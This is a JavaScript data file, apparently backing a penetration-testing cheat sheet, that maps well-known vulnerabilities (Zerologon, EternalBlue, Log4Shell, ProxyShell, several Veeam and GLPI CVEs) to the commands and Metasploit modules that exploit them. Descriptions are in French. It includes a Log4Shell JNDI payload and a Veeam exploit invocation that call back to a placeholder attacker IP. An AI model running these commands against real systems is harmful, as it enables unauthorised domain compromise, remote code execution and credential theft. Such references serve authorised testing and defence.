export const QUICK_COMPROMISE_DATA = [
  {
    name: 'Zerologon (CVE-2020-1472)',
    nodes: [
      { 
        label: 'zerologon-scan <dc_netbios_name> <ip>', 
        cmd: 'zerologon-scan <dc_netbios_name> <ip>', 
        leadsTo: 'Admin',
        description: 'Vérifie si le Contrôleur de Domaine est vulnérable à ZeroLogon (réinitialisation du mot de passe machine).'
      },
      { 
        label: 'cve-2020-1472-exploit.py <BIOS_NAME> <ip>', 
        cmd: 'python3 cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>', 
        leadsTo: 'Admin',
        description: 'Exploite la vulnérabilité cryptographique dans Netlogon pour passer le mot de passe du compte machine du DC à vide.'
      }
    ]
  },
  {
    name: 'EternalBlue (MS17-010)',
    nodes: [
      { 
        label: 'EternalBlue SMBv1 Exploit', 
        cmd: 'msf> use exploit/windows/smb/ms17_010_eternalblue', 
        leadsTo: 'Admin (SYSTEM)',
        description: 'Exploit RCE critique ciblant le protocole SMBv1 (Windows XP à Server 2016 non patchés).'
      }
    ]
  },
  {
    name: 'Tomcat / JBoss',
    nodes: [
      { 
        label: 'Tomcat Enum', 
        cmd: 'msf> use auxiliary/scanner/http/tomcat_enum', 
        leadsTo: 'Low access',
        description: 'Tente de deviner les identifiants par défaut du manager Tomcat (ex: tomcat/s3cret).'
      },
      { 
        label: 'Tomcat Manager Deploy', 
        cmd: 'msf> use exploit/multi/http/tomcat_mgr_deploy', 
        leadsTo: 'Admin',
        description: 'Déploie une application WAR malveillante via l\'interface manager authentifiée pour obtenir un shell.'
      }
    ]
  },
  {
    name: 'Java RMI & Serialisation',
    nodes: [
      { 
        label: 'Java RMI Server Exploit', 
        cmd: 'msf> use exploit/multi/misc/java_rmi_server', 
        leadsTo: 'Admin',
        description: 'Exploite la configuration par défaut du registre RMI Java pour charger des classes distantes.'
      },
      { 
        label: 'ysoserial JBoss/Java', 
        cmd: 'java -jar ysoserial.jar <gadget> <cmd> | nc <ip> <port>', 
        leadsTo: 'Low access',
        description: 'Génère des payloads pour exploiter la désérialisation non sécurisée d\'objets Java.'
      },
      { 
        label: 'Log4Shell (CVE-2021-44228)', 
        cmd: '${jndi:ldap://<attacker_ip>:<port>/o}', 
        leadsTo: 'Low access / Admin',
        description: 'Injection JNDI dans les logs forçant le serveur à télécharger et exécuter du code distant via LDAP/RMI.'
      }
    ]
  },
  {
    name: 'MSSQL Database',
    nodes: [
      { 
        label: 'MSSQL Login Enum', 
        cmd: 'msf> use auxiliary/admin/mssql/mssql_enum_sql_logins', 
        leadsTo: 'Low access',
        description: 'Bruteforce et énumération des comptes SQL (sa, admin) sur le port 1433.'
      }
    ]
  },
  {
    name: 'Microsoft Exchange',
    nodes: [
      { 
        label: 'ProxyShell RCE', 
        cmd: 'python3 proxyshell_rce.py -u https://<exchange> -e administrator@<domain>', 
        leadsTo: 'Admin (SYSTEM)',
        description: 'Chaîne de 3 vulnérabilités (ACL Bypass + PrivEsc + RCE) sur les serveurs Exchange non patchés (2021).'
      }
    ]
  },
  {
    name: 'Veeam Backup',
    nodes: [
      { 
        label: 'VeeamHax (CVE-2023-27532)', 
        cmd: 'VeeamHax.exe -target <veeam_server>', 
        leadsTo: 'Admin (Creds Leak)',
        description: 'Accès non authentifié au service Veeam.Backup.Service.exe pour extraire les mots de passe chiffrés.'
      },
      { 
        label: 'Auth Bypass (CVE-2024-29849)', 
        cmd: 'python3 CVE-2024-29849.py -target https://<veeam_ip>:<port> --callback <attacker_ip>', 
        leadsTo: 'Admin',
        description: 'Contournement critique de l\'authentification sur Veeam Enterprise Manager.'
      },
      { 
        label: 'Veeam Orchestrator (CVE-2024-29855)', 
        cmd: 'python3 CVE-2024-29855.py --start_time <epoch> --username <user>@<domain> -target <url>', 
        leadsTo: 'Admin',
        description: 'Authentication Bypass via la manipulation de tokens dans Veeam Recovery Orchestrator.'
      },
      { 
        label: 'Veeam Unserialize (CVE-2024-40711)', 
        cmd: 'CVE-2024-40711.exe -f binaryformatter -g Veeam --targetveeam <veeam_ip>', 
        leadsTo: 'Admin',
        description: 'RCE via désérialisation non authentifiée sur le port 9392 (Veeam Backup & Replication).'
      }
    ]
  },
  {
    name: 'GLPI Asset Management',
    nodes: [
      { 
        label: 'htmLawedTest (CVE-2022-35914)', 
        cmd: 'curl <ip>/vendor/htmlawed/htmlawed/htmLawedTest.php', 
        leadsTo: 'Low access',
        description: 'Script de test tiers accessible publiquement permettant l\'exécution de commandes PHP.'
      },
      { 
        label: 'GLPI RCE (CVE-2023-41320)', 
        cmd: 'python3 cve_2023_41320.py -u <user> -p <password> -t <ip>', 
        leadsTo: 'Admin',
        description: 'RCE authentifiée exploitant une faille dans la gestion des plugins marketplace.'
      }
    ]
  },
  {
    name: 'Automated Scanners',
    nodes: [
      { 
        label: 'Nuclei Scan', 
        cmd: 'nuclei -target <ip_range>', 
        leadsTo: 'User Account / Admin',
        description: 'Scanner de vulnérabilités rapide basé sur des templates communautaires.'
      },
      { 
        label: 'Nessus Scan', 
        cmd: 'nessus -q <target>', 
        leadsTo: 'Low access / Admin',
        description: 'Scanner commercial complet pour identifier les défauts de patch et de configuration.'
      }
    ]
  }
];